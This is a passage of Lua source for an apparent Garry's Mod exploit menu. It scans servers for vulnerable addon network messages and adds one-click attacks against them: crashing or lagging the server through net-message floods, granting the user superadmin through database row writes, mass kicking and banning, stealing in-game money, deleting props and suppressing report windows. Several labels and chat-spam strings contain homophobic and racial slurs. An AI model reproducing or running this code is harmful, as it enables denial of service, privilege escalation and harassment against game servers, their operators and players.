	            surface.DrawOutlinedRect(0, 25, id:GetSize())
	        else
	            draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
	            surface.SetDrawColor(Color(0, 0, 0, 255))
	            surface.DrawOutlinedRect(0, 0, id:GetSize())
	            surface.DrawOutlinedRect(0, 25, id:GetSize())
	        end
	    end
	end

	--////////////////// [EXPLOITS] ////////////////////
	status = ValidNetString("TCBBuyAmmo")

	if (status) then
	    ECPrint("Found Exploit: Free Ammo [TCBBuyAmmo]")

	    addExploit("1", "Free Ammo", "Gets All Ammo Types", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Getting Le Ammo")

	        for k, v in pairs(GAMEMODE.AmmoTypes) do
	            net.Start("TCBBuyAmmo")
	            net.WriteTable({nil, v.ammoType, nil, "0", "999999"})
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("DataSend")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #1 [DataSend]")

	    addExploit("2", "Steal All Monies #1", "Takes money from printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass() == "adv_moneyprinter" then
	                ECPrint("Collecting Money")
	                net.Start("DataSend")
	                net.WriteFloat(2)
	                net.WriteEntity(v)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("FarmingmodSellItems")

	if (status) then
	    ECPrint("Found Exploit: Free Money [FarmingmodSellItems]")

	    addExploit("3", "Free Money", "An exploit in the Farming Mod", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Enjoy the b1g monies")
	        net.Start("FarmingmodSellItems")

	        net.WriteTable({
	            Cost = 10,
	            CropModel = "models/props/eryk/garlic.mdl",
	            CropType = 2,
	            Info = "Garlic Seed",
	            Model = "models/props/eryk/seedbag.mdl",
	            Name = "Garlic",
	            Quality = 4,
	            Sell = 99999,
	            Type = "Seed"
	        })

	        net.WriteInt(1, 16)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("start_wd_emp")

	if (status) then
	    ECPrint("Found Exploit: Hack Keypad [start_wd_emp]")

	    addExploit("4", "Hack Keypad", "Instantly opens nearby keypads. Has a cooldown", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Hacking Keypads")
	        net.Start("start_wd_emp")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("duelrequestguiYes")

	if (status) then
	    ECPrint("Found Exploit: Get Money [duelrequestguiYes]")

	    addExploit("5", "Get Money", "Duel Exploit", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("getting ez monies")
	        net.Start("duelrequestguiYes")
	        net.WriteInt(-99999999999999999999999999999999999999999999999999999999999999999999999999999, 32)
	        net.WriteEntity(table.Random(player.GetAll()))
	        net.WriteString("Crossbow")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DarkRP_Kun_ForceSpawn")

	if (status) then
	    ECPrint("Found Exploit: Respawn #1 [DarkRP_Kun_ForceSpawn]")

	    addExploit("6", "Respawn #1", "Just respawn", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Respawn")
	        net.Start("DarkRP_Kun_ForceSpawn")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SyncPrinterButtons76561198056171650")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #2 [SyncPrinterButtons76561198056171650]")

	    addExploit("7", "Steal All Monies #2", "Takes money from printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Collecting Money")

	        for k, v in pairs(ents.GetAll()) do
	            if (v:GetClass() == "adv_moneyprinter") then
	                net.Start("SyncPrinterButtons76561198056171650")
	                net.WriteEntity(v)
	                net.WriteUInt(2, 4)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	---------------------------------------------------------------------------------------------
	local function report()
	    for i = 1, 2000 do
	        net.Start("DL_Answering")
	        net.SendToServer()
	    end
	end

	if (Damagelog) then
	    ECPrint("Found Exploit: Kick All Players")
	    reportSpam = 0

	    addExploit("1337", "Kick All Players", "Kicks all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if (reportSpam == 0) then
	            ECNotify("Starting Kicker")
	            reportSpam = 1
	            timer.Create("reportSpammer", 0.05, 0, report)
	        else
	            ECNotify("Stopping Kicker")
	            reportSpam = 0
	            timer.Remove("reportSpammer")
	        end
	    end)
	end

	----------------------------------------------------------------------------------------------
	status = ValidNetString("SimplicityAC_aysent")

	if (status) then
	    ECPrint("Found Exploit: Crash #1 [SimplicityAC_aysent]")

	    addExploit("8", "Crash #1", "Will instantly crash the server", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Goodbye Server")
	        local tbl = {}

	        for i = 1, 400 do
	            tbl[i] = i
	        end

	        net.Start("SimplicityAC_aysent")
	        net.WriteUInt(1, 8)
	        net.WriteUInt(4294967295, 32)
	        net.WriteTable(tbl)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("RevivePlayer")

	if (status) then
	    ECPrint("Found Exploit: Reanimation #1 [RevivePlayer]")

	    addExploit("9", "Reanimation #1", "Instant revival", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("reanimation1") then
	            ECNotify("Enabled")

	            timer.Create("reanimation1", 0.5, 0, function()
	                if not LocalPlayer():Alive() then
	                    net.Start("RevivePlayer")
	                    net.WriteEntity(LocalPlayer())
	                    net.SendToServer()
	                end
	            end)
	        else
	            timer.Remove("reanimation1")
	            ECNotify("Disabled")
	        end
	    end)
	end

	status = ValidNetString("NLRKick")

	if (status) then
	    ECPrint("Found Exploit: Kick Everyone [NLRKick]")

	    addExploit("10", "Kick Everyone", "kick all the beaners", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Kicking All")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("NLRKick")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("timebombDefuse")

	if (status) then
	    ECPrint("Found Exploit: Delete All Props [timebombDefuse]")

	    addExploit("11", "Delete All Props", "props = dead", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Props De_Stroyed")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("timebombDefuse")
	            net.WriteEntity(v)
	            net.WriteBool(true)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NDES_SelectedEmblem")

	if (status) then
	    ECPrint("Found Exploit: Lagger #2 [NDES_SelectedEmblem]")

	    addExploit("12", "Lagger #2", "oof yuh get l4gged", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger2") then
	            timer.Create("lagger2", 0.5, 0, function()
	                for i = 1, 2000 do
	                    net.Start("NDES_SelectedEmblem", true)
	                    net.WriteString("seized")
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger2")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("Morpheus.StaffTracker")

	if (status) then
	    ECPrint("Found Exploit: Crasher #1 [Morpheus.StaffTracker]")

	    addExploit("13", "Crasher #1", "not even hard. unlike nippy's dick when he sees voltz", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("crasher1") then
	            timer.Create("crasher1", 0.5, 0, function()
	                for i = 1, 2000 do
	                    net.Start("Morpheus.StaffTracker")
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Crashing Server")
	        else
	            timer.Remove("crasher1")
	            ECNotify("Canceling Crasher")
	        end
	    end)
	end

	status = ValidNetString("egg")

	if (status) then
	    ECPrint("Found Exploit: Get Easter Egg")

	    addExploit("14", "Get Easter Egg", "ez eggs", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        RunConsoleCommand("say", "4bigz")
	        RunConsoleCommand("cc_egg2")
	        net.Start("egg")
	        net.SendToServer()
	        ECNotify("Gave Easter Egg")
	    end)
	end

	status = ValidNetString("pplay_deleterow")

	if (status) then
	    ECPrint("Found Exploit: GET SUPERADMIN [pplay_deleterow]")

	    addExploit("15", "GET SUPERADMIN", "Rejoin game after clicking", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        local id = LocalPlayer():SteamID()
	        local tbl = {}
	        tbl.name = "FAdmin_PlayerGroup"
	        tbl.where = {"steamid", tostring(id)}
	        net.Start("pplay_deleterow")
	        net.WriteTable(tbl)
	        net.SendToServer()
	        local tbl = {}
	        tbl.tblname = "FAdmin_PlayerGroup"
	        tbl.tblinfo = {tostring(id), "superadmin"}
	        net.Start("pplay_addrow")
	        net.WriteTable(tbl)
	        net.SendToServer()
	        ECNotify("promotion ;)")
	    end)
	end

	-- ttt report bypass by daddy grampa
	local function CheckChild(pan)
	    local title = "You have been reported! Please answer all your reports."
	    if not pan or not IsValid(pan) then return end

	    if pan.GetTitle and pan:GetTitle() == title then
	        pan:Remove()
	        print("Removed warning box")

	        return
	    end

	    for k, v in pairs(pan:GetChildren()) do
	        if v.GetTitle and v:GetTitle() == title then
	            v:Remove()
	            print("Removed warning box")

	            return
	        end

	        if #v:GetChildren() > 0 then
	            CheckChild(v)
	        end
	    end
	end

	if (engine.ActiveGamemode() == "terrortown") then
	    bypass = 0
	    ECPrint("Found Exploit: TTT Report Bypass")

	    addExploit("16", "Toggle TTT Report Bypass", "b1g bypass amirite", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if (bypass == 0) then
	            hook.Add("Think", "remove_ttt_report", function()
	                local pan = vgui.GetHoveredPanel()
	                CheckChild(pan)
	            end)

	            ECNotify("Enabled Report Bypass")
	            bypass = 1
	        else
	            hook.Remove("Think", "remove_ttt_report")
	            ECNotify("Disabled Report Bypass")
	            bypass = 0
	        end
	    end)
	end

	status = ValidNetString("EZS_PlayerTag")

	if (status) then
	    ECPrint("Found Exploit: Lagger #3 [EZS_PlayerTag]")

	    addExploit("17", "Lagger #3", "b1g lags my duder", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger3") then
	            timer.Create("lagger3", 0.5, 0, function()
	                for k, v in pairs(player.GetAll()) do
	                    net.Start("EZS_PlayerTag", true)
	                    net.WriteEntity(v)
	                    net.WriteString("Seized")
	                    net.SendToServer()

	                    timer.Simple(2, function()
	                        net.Start("EZS_PlayerTag", true)
	                        net.WriteEntity(v)
	                        net.WriteString("Seized")
	                        net.SendToServer()
	                    end)
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger3")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	if ConVarExists("advttt_spreadovertime_enabled") then
	    ECPrint("Found Exploit: Remove Spread")

	    addExploit("18", "Remove Spread", "pSilent No Spread", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
	        ECNotify("Spread Removed")
	    end)
	end

	status = ValidNetString("fp_as_doorHandler")

	if (status) then
	    ECPrint("Found Exploits: Open Door, Close Door, Remove Door Owners [fp_as_doorHandler]")

	    addExploit("19", "Open Door", "Force open the door you are looking at", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        net.Start("fp_as_doorHandler")
	        net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	        net.WriteString("unlock")
	        net.SendToServer()
	        ECNotify("Opened Door")
	    end)
	end

	status = ValidNetString("fp_as_doorHandler")

	if (status) then
	    addExploit("20", "Close Door", "Force close the door you are looking at", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        net.Start("fp_as_doorHandler")
	        net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	        net.WriteString("lock")
	        net.SendToServer()
	        ECNotify("Opened Door")
	    end)
	end

	status = ValidNetString("fp_as_doorHandler")

	if (status) then
	    addExploit("21", "Remove Door Owner", "Force remove door owner of the door you are looking at", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        local door = LocalPlayer():GetEyeTrace().Entity
	        local doorOwner = door:getDoorData()["owner"]
	        net.Start("fp_as_doorHandler")
	        net.WriteEntity(door)
	        net.WriteString("removeOwner")
	        net.WriteDouble(doorOwner)
	        net.SendToServer()
	        ECNotify("Opened Door")
	    end)
	end

	status = ValidNetString("VJSay")

	if (status) then
	    ECPrint("Found Exploit: VJSay [OLD] [VJSay]")

	    addExploit("22", "VJSay [OLD]", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrame2Exists = true
	        inputFrame2 = vgui.Create("DFrame")
	        inputFrame2:SetTitle("Enter your message!")
	        inputFrame2:SetSize(400, 75)
	        inputFrame2:SetPos(ScrW() / 2 - inputFrame2:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame2:SetDraggable(false)
	        inputFrame2:ShowCloseButton(false)
	        inputFrame2:MakePopup()

	        inputFrame2.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry2 = vgui.Create("DTextEntry", inputFrame2)
	        TextEntry2:SetSize(380, 30)
	        TextEntry2:SetPos(inputFrame2:GetWide() / 2 - TextEntry2:GetWide() / 2, inputFrame2:GetTall() / 2 - TextEntry2:GetTall() / 2)
	        TextEntry2:SetText("Broadcast Msg")

	        TextEntry2.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Broadcasting")
	            net.Start("VJSay")
	            net.WriteEntity(nil)
	            net.WriteString(TextEntry2:GetValue())
	            net.WriteString("")
	            net.SendToServer()
	            inputFrame2:SetVisible(false)
	        end
	    end)
	end

	status = ValidNetString("ply_pick_shit")

	if (status) then
	    ECPrint("Found Exploit: free money amirite [ply_pick_shit]")

	    addExploit("23", "free money amirite", "stacks in ur wallet generator", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(player.GetAll()) do
	            for i = 1, 255 do
	                net.Start("ply_pick_shit")
	                net.WriteEntity(LocalPlayer())
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end

	        ECNotify("enjoy monies")
	    end)
	end

	status = ValidNetString("pac.net.TouchFlexes.ClientNotify")

	if (status) then
	    ECPrint("Found Exploit: Crasher #2 [pac.net.TouchFlexes.ClientNotify]")

	    addExploit("24", "Crasher #2", "big lagz", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("crasher2") then
	            timer.Create("crasher2", 0, 0, function()
	                for i = 1, 400 do
	                    net.Start("pac.net.TouchFlexes.ClientNotify")
	                    net.WriteInt(9999999999999999999999999999999999999999999999999999999999999999999999, 13)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Crasher")
	        else
	            timer.Remove("crasher2")
	            ECNotify("Stopping Crasher")
	        end
	    end)
	end

	status = ValidNetString("BM2.Command.SellBitcoins")

	if (status) then
	    ECPrint("Found Exploit: Sell Your Bitcoins [BM2.Command.SellBitcoins]")

	    addExploit("25", "Sell your Bitcoins", "sells your and other peoples bitcoins at a great distance", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(ents.FindByClass("bm2_bitminer_1")) do
	            net.Start("BM2.Command.SellBitcoins")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end

	        for k, v in pairs(ents.FindByClass("bm2_bitminer_2")) do
	            net.Start("BM2.Command.SellBitcoins")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end

	        for k, v in pairs(ents.FindByClass("bm2_bitminer_rack")) do
	            net.Start("BM2.Command.SellBitcoins")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("BM2.Command.Eject")

	if (status) then
	    ECPrint("Found Exploit: Lagger #4 [BM2.Command.Eject]")

	    addExploit("26", "Lagger #4", "discovered by triggered", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger4") then
	            timer.Create("lagger4", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("BM2.Command.Eject", true)
	                    net.WriteInt(9999999999999999999999999999999999999999999999999999999999999999999999, 8)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger4")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("BM2.Command.SellBitcoins")

	if (status) then
	    ECPrint("Found Exploit: Lagger #5 [BM2.Command.SellBitcoins]")

	    addExploit("27", "Lagger #5", "discovered by Leith, an exploit in the addon 'Bitminers 2'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        timer.Create("lagger5", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("BM2.Command.SellBitcoins", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("ItemStoreUse")

	if (status) then
	    ECPrint("Found Exploit: Lagger #6 [ItemStoreUse]")

	    addExploit("28", "Lagger #6", "discovered by triggered, an exploit in the addon 'ItemStore'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger6") then
	            timer.Create("lagger6", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("ItemStoreUse", true)
	                    net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                    net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger6")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("ItemStoreDrop")

	if (status) then
	    ECPrint("Found Exploit: Lagger #7 [ItemStoreDrop]")

	    addExploit("29", "Lagger #7", "discovered by Leith, an exploit in the addon 'ItemStore'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger7") then
	            timer.Create("lagger7", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("ItemStoreDrop", true)
	                    net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                    net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger7")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("gMining.sellMineral")

	if (status) then
	    ECPrint("Found Exploit: Lagger #8 [gMining.sellMineral]")

	    addExploit("30", "Lagger #8", "discovered by Leith, an exploit in the addon 'gMining'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("lagger8") then
	            timer.Create("lagger8", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("gMining.sellMineral", true)
	                    net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 3)
	                    net.WriteString(" ")
	                    net.SendToServer()
	                end
	            end)
	        end
	    end)
	end

	status = ValidNetString("PlayerUseItem")

	if (status) then
	    ECPrint("Found Exploit: Lagger #9 [PlayerUseItem]")

	    addExploit("31", "Lagger #9", "discovered by triggered", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger9") then
	            timer.Create("lagger9", 0, 0, function()
	                for i = 1, 800 do
	                    net.Start("PlayerUseItem", true)
	                    net.WriteInt(99999999999999999999999999999999999999999999999, 32)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger9")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("RequestMAPSize")

	if (status) then
	    ECPrint("Found Exploit: Lagger #10 [RequestMAPSize]")

	    addExploit("32", "Lagger #10", "1tap server", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger10") then
	            timer.Create("lagger10", 0, 0, function()
	                for i = 1, 400 do
	                    net.Start("RequestMAPSize", true)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger10")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("MG2.Request.GangRankings")

	if (status) then
	    ECPrint("Found Exploit: Lagger #11 [MG2.Request.GangRankings]")

	    addExploit("33", "Lagger #11", "discovered by Leith, an exploit in the addon 'MGangs 2'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger11") then
	            timer.Create("lagger11", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("MG2.Request.GangRankings", true)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger11")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("dLogsGetCommand")

	if (status) then
	    ECPrint("Found Exploit: Lagger #12 [dLogsGetCommand]")

	    addExploit("34", "Lagger #12", "b1g lags", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting Lagger")

	        for i = 1, 7000 do
	            net.Start("dLogsGetCommand", true)

	            net.WriteTable({
	                cmd = "+forward",
	                args = " "
	            })

	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("ats_send_toServer")

	if (status) then
	    ECPrint("Found Exploit: Lagger #13 [ats_send_toServer]")

	    addExploit("35", "Lagger #13", "big lags", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting Lagger")

	        for i = 1, 2000 do
	            net.Start("ats_send_toServer", true)
	            net.WriteTable({" ", "Open", nil, nil, nil, nil})
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("shopguild_buyitem")

	if (status) then
	    ECPrint("Found Exploit: Guild Exploit [shopguild_buyitem]")

	    addExploit("36", "Guild Exploit", "increases the level of your guild", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Guild level successfully upgraded")
	        local level = tonumber(LocalPlayer():GetNWInt("lvlguild"))

	        if level > tonumber(LocalPlayer():GetNWInt("lvlguild")) then
	            level = tonumber(LocalPlayer():GetNWInt("lvlguild"))
	        end

	        net.Start("shopguild_buyitem")
	        net.WriteString("lvl")
	        net.WriteDouble(level)
	        net.WriteString("Guild Level " .. level)
	        net.WriteEntity(LocalPlayer())
	        net.WriteUInt(2, 4)
	        net.WriteDouble(0)
	        net.SendToServer()
	        level = level + 1
	    end)
	end

	status = ValidNetString("VoteKickNO")

	if (status) then
	    ECPrint("Found Exploit: Votekick [VoteKickNO]")

	    addExploit("37", "Votekick", "kicking all", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("VoteKickNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(6)
	            net.SendToServer()
	            net.Start("VoteKickNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(6)
	            net.SendToServer()
	            net.Start("VoteKickNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(6)
	            net.SendToServer()
	            net.Start("VoteKickNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(6)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("VoteBanNO")

	if (status) then
	    ECPrint("Found Exploit: Voteban [VoteBanNO]")

	    addExploit("38", "Voteban", "bans all", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("VoteBanNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(8)
	            net.SendToServer()
	            net.Start("VoteBanNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(8)
	            net.SendToServer()
	            net.Start("VoteBanNO")
	            net.WriteFloat(v:EntIndex())
	            net.WriteFloat(8)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NewReport")

	if (status) then
	    ECPrint("Found Exploit: Custom Report [NewReport]")

	    addExploit("39", "Custom Report", "Report all faggots", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("NewReport")
	            net.WriteType(ply)
	            net.WriteInt(8, 5)
	            net.WriteString("hahaha")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("Warn_CreateWarn")

	if (status) then
	    ECPrint("Found Exploit: Custom Warn [Warn_CreateWarn]")

	    addExploit("40", "Custom Warn", "Warn all faggots", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("Warn_CreateWarn")
	            net.WriteEntity(ply)
	            net.WriteString("hahaha")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("showDisguiseHUD")

	if (status) then
	    ECPrint("Found Exploit: Disguise #2 [showDisguiseHUD]")

	    addExploit("41", "Disguise #2", "allows you to disguise as any job", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECPrint("Choose a disguise")
	        PlayerCount = 0

	        for k, v in pairs(player.GetAll()) do
	            PlayerCount = PlayerCount + 1
	        end

	        local TeamNum
	        local disguise_Model_Preview_Default
	        local base = vgui.Create("DFrame")
	        base:SetSize(300, 420)
	        base:Center()
	        base:SetTitle(" ")
	        base:ShowCloseButton(false)
	        base:MakePopup()

	        function base:Paint()
	            draw.RoundedBoxEx(5, 0, 0, base:GetWide(), base:GetTall(), Color(20, 20, 20, 200), false, true)
	            draw.RoundedBox(0, 0, 30, base:GetWide(), base:GetTall() - 60, Color(10, 10, 10, 200))
	            draw.RoundedBox(0, 0, 30, base:GetWide(), 5, Color(255, 255, 255, 255))
	            draw.RoundedBox(0, 0, 390, base:GetWide(), 5, Color(255, 255, 255, 255))
	            draw.SimpleText("Disguise", "DisFontBold", base:GetWide() / 4, -1)
	        end

	        local ExitButton = vgui.Create("DButton", base)
	        ExitButton:SetPos(base:GetWide() + 4 - ExitButton:GetWide())
	        ExitButton:SetText("Close")
	        ExitButton:SetSize(60, 20)
	        ExitButton:SetFont("DermaDefaultBold")

	        ExitButton.Paint = function()
	            if ExitButton.Hovered then
	                if ExitButton:IsDown() then
	                    ExitButton:SetTextColor(Color(200, 200, 200, 200))
	                    draw.RoundedBoxEx(5, 0, 0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255, 0, 0, 200), false, true)
	                else
	                    ExitButton:SetTextColor(Color(255, 255, 255, 255))
	                    draw.RoundedBoxEx(5, 0, 0, ExitButton:GetWide(), ExitButton:GetTall(), Color(255, 0, 0, 255), false, true)
	                end
	            else
	                ExitButton:SetTextColor(Color(20, 20, 20, 200))
	                draw.RoundedBoxEx(5, 0, 0, ExitButton:GetWide(), ExitButton:GetTall(), Color(200, 0, 0, 200), false, true)
	            end
	        end

	        function ExitButton.DoClick()
	            base:Remove()
	            net.Start("changeToPhysgun")
	            net.SendToServer()
	        end

	        local DTeamChoice = vgui.Create("DComboBox", base)
	        DTeamChoice:SetSize(150, 22)
	        DTeamChoice:SetPos(75, 50)
	        DTeamChoice:SetValue("Select Job")

	        for k, v in pairs(team.GetAllTeams()) do
	            if not (HIDDEN_TEAMS[k]) and (team.NumPlayers(k) ~= 0) then
	                DTeamChoice:AddChoice(team.GetName(k))
	            end
	        end

	        DTeamChoice.OnSelect = function(panel, index, value)
	            for k, _ in pairs(team.GetAllTeams()) do
	                if value == team.GetName(k) then
	                    for _, v in pairs(player.GetAll()) do
	                        if v:Team() == k then
	                            TeamNum = v:Team()
	                            disguise_Model_Preview_Default = v:GetModel()
	                        end
	                    end
	                end
	            end

	            timer.Create("RefreshModel", 0.1, 0, function()
	                local icon = vgui.Create("DModelPanel", base)
	                icon:SetSize(300, 260)
	                icon:SetPos(-5, 80)
	                icon:SetFOV(68)
	                icon:SetModel(disguise_Model_Preview_Default)

	                timer.Simple(0.1, function()
	                    icon:Remove()
	                end)
	            end)

	            local DisguiseButton = vgui.Create("DButton", base)
	            DisguiseButton:SetPos(base:GetWide() / 2.5, 360)
	            DisguiseButton:SetSize(60, 20)
	            DisguiseButton:SetText("Accept")
	            DisguiseButton:SetFont("DermaDefaultBold")

	            function DisguiseButton:Paint()
	                if DisguiseButton.Hovered then
	                    if DisguiseButton:IsDown() then
	                        DisguiseButton:SetTextColor(Color(200, 200, 200, 200))
	                        draw.RoundedBoxEx(0, 0, 0, DisguiseButton:GetWide(), DisguiseButton:GetTall(), Color(60, 200, 0, 200))
	                    else
	                        DisguiseButton:SetTextColor(Color(255, 255, 255, 255))
	                        draw.RoundedBoxEx(0, 0, 0, DisguiseButton:GetWide(), DisguiseButton:GetTall(), Color(60, 220, 0, 255))
	                    end
	                else
	                    DisguiseButton:SetTextColor(Color(20, 20, 20, 200))
	                    draw.RoundedBoxEx(0, 0, 0, DisguiseButton:GetWide(), DisguiseButton:GetTall(), Color(60, 200, 0, 255))
	                end
	            end

	            function DisguiseButton:DoClick()
	                net.Start("SetPlayerModel")

	                if ChosenName == nil then
	                    net.WriteString(LocalPlayer():Nick())
	                else
	                    net.WriteString(ChosenName)
	                end

	                net.WriteUInt(TeamNum, 16)
	                net.SendToServer()
	                base:Close()
	                net.Start("changeToPhysgun")
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("Chatbox_PlayerChat")

	if (status) then
	    ECPrint("Found Exploit: WilloxChat Spam [Chatbox_PlayerChat]")

	    addExploit("42", "WilloxChat Spam", "spam in chat", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("willoxchatspam", 1, 0, function()
	            net.Start("Chatbox_PlayerChat")
	            net.WriteEntity(LocalPlayer())
	            net.WriteBit(1)
	            net.WriteString("FAGGOTS")
	            net.WriteBit(1)
	            net.SendToServer()
	        end)
	    end)
	end

	status = ValidNetString("BuilderXToggleKill")

	if (status) then
	    ECPrint("Found Exploit: BuilderXToggleKill [BuilderXToggleKill]")

